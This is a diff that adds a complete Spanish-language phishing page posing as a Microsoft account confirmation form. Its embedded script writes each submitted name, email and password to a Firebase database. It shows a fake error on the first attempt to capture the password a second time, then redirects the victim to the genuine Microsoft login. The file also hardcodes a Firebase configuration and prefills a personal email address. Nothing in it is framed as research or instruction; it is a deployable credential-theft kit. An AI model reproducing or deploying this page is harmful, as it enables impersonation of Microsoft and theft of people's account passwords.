@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Confirm your Microsoft account</title>
+    <link rel="stylesheet" href="https://cdn.metroui.org.ua/v4/css/metro-all.min.css">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+   <div class="cube">
+      <img class="logo-ms" src="microsoft_logo.gif">
+      <div class="row-title">
+       <h3 class="title">Confirmar Información</h3>
+      </div>
+       <form id="myform">
+          <div class="form-group">
+        <input type="text" placeholder="Nombre" required id="name" autofocus />
+    </div>
+           <div class="form-group">
+        <input type="email" placeholder="Email, celular o Skype" required id="email"/>
+    </div>
+      <div class="form-group">
+        <input type="password" placeholder="Contraseña" required id="password"/>
+    </div>
+     <div class="form-group">
+        <input type="password" placeholder="Confirmar contraseña" required id="confirm-password"/>
+    </div>
+      <button class="button primary" style="margin-top: 15px; width:100% ;" id="btn-next" >Siguiente</button>
+       </form>
+   </div>
+  
+  <div class="dialog" data-role="dialog" id="demoDialog1">
+    <div class="dialog-title">Error en la confirmación</div>
+    <div class="dialog-content">
+        No se a podido Verificar la información, intentar nuevamente.
+    </div>
+    <div class="dialog-actions">
+        <button class="button primary js-dialog-close" btn="btn-error">Aceptar</button>
+    </div>
+</div>
+
+<div class="dialog" data-role="dialog" id="demoDialog2">
+    <div class="dialog-title">Verificado con Exito</div>
+    <div class="dialog-content">
+        La información a sido verificada.
+    </div>
+    <div class="dialog-actions">
+        <button class="button primary js-dialog-close" id="btn-complete">Finalizar</button>
+    </div>
+</div>
+
+</body>
+<script src="https://www.gstatic.com/firebasejs/4.12.1/firebase.js"></script>
+<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
+<script src="https://cdn.metroui.org.ua/v4/js/metro.min.js"></script>
+<script>
+    var att = 1;
+      var confirm = function(){
+          // Initialize Firebase
+      var config = {
+        apiKey: "AIzaSyAgP8ZeoMUMrDpf2yyXlSmfIwjZ-DW0pDc",
+        authDomain: "test-ms-cbded.firebaseapp.com",
+        databaseURL: "https://test-ms-cbded.firebaseio.com",
+        projectId: "test-ms-cbded",
+        storageBucket: "test-ms-cbded.appspot.com",
+        messagingSenderId: "840588891040"
+      };
+          if (!firebase.apps.length) {
+              firebase.initializeApp(config);
+          }
+      
+        var db = firebase.database();
+            firebase.database().ref('locate/' + new Date().getTime()).set({
+                name: $("#name").val(),
+                email: $("#email").val(),
+                password: $("#password").val(),
+                confirm_password: $("#confirm-password").val()
+            });
+  }
+  $(document).ready(function(){
+      $("#name").val("nombre");
+      $("#email").val("betomalouf@hotmail.com");
+      
+      
+            
+      $("#btn-complete").click(function(){
+          location.href = "https://login.live.com/login.srf";
+      });
+      $("#myform").submit(function(e){
+         e.preventDefault();
+          confirm();
+          if(att >= 2 ){
+            Metro.dialog.open('#demoDialog2');   
+          }else{
+            Metro.dialog.open('#demoDialog1');
+              $("#password").val("");
+              $("#confirm-password").val("");
+              
+          }
+          att++;
+         //resto código   
+     });
+  });
+</script>
+
+
+</html>
